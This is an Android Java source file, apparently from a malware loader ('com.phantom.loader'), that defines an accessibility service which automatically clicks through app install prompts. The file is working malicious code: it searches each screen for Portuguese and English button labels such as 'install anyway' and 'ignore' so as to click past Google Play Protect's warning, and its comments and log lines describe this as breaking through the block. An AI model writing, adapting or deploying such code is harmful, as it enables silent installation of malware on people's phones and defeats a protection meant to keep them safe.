package com.phantom.loader;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

public class AutoClickerService extends AccessibilityService {
    private static final String TAG = "AutoClicker";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) clicar(root);
        }
    }

    private void clicar(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.getText() != null) {
            String t = node.getText().toString().toLowerCase();
            
            // 1. Instalação normal
            if (t.equals("instalar") || t.equals("install") || t.equals("abrir") || t.equals("open")) {
                node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                Log.d(TAG, "Clicou em Instalar/Abrir");
            }
            // 2. Tela vermelha do Play Protect (Mais detalhes)
            else if (t.contains("mais detalhes") || t.contains("more details") || t.contains("detalhes") || t.contains("details")) {
                node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                Log.d(TAG, "Abriu Mais Detalhes");
            }
            // 3. Botão final do Play Protect (Instalar assim mesmo)
            else if (t.contains("assim mesmo") || t.contains("anyway") || t.contains("ignorar") || t.contains("ignore") || t.equals("ok") || t.equals("entendi")) {
                node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                Log.d(TAG, "Furou o bloqueio");
            }
        }
        
        // Varre todos os elementos da tela
        for (int i = 0; i < node.getChildCount(); i++) { 
            clicar(node.getChild(i)); 
        }
    }

    @Override
    public void onInterrupt() {}
}
